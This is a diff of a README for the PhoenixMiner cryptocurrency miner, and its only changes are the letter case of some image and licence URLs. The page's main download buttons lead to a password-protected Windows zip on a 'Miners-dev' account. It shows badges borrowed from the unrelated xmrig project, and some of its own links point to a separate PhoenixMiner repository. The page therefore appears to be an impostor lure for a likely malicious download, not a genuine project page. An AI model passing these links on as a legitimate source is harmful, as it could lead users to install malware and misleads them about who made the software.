@@ -1,13 +1,13 @@
 <p align="center">
 <a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
+<img src="https://github.com/Miners-dev/phoenixminer/blob/master/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
 </p>
 
 <p align="center">
 <a href="https://github.com/PhoenixMiner/PhoenixMiner/releases" alt="Activity">
 <img src="https://img.shields.io/github/downloads/xmrig/xmrig/total.svg" /></a>
 
-<a href="https://github.com/PhoenixMiner/PhoenixMiner/blob/master/License.txt" alt="Activity">
+<a href="https://github.com/PhoenixMiner/phoenixminer/blob/master/License.txt" alt="Activity">
 <img src="https://img.shields.io/github/license/xmrig/xmrig-amd.svg" /></a>
 <a href="#" alt="Activity">
 <img src="https://img.shields.io/github/release-date-pre/xmrig/xmrig-amd.svg" /></a>
@@ -22,7 +22,7 @@
 </p>
 <p align="center">
 <a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
+<img src="https://github.com/Miners-dev/phoenixminer/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
 </p>
 
 <p>PhoenixMiner is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
@@ -57,13 +57,13 @@
 * API for rig monitoring
 
 
-<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/mining.jpg?raw=true" width="866" >
+<img src="https://github.com/Miners-dev/phoenixminer/blob/master/files/git-files/mining.jpg?raw=true" width="866" >
 
 ## Download
 
 <p>
 <a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
+<img src="https://github.com/Miners-dev/phoenixminer/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
 
 * Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
 * Git tree: https://github.com/PhoenixMiner/PhoenixMiner.git
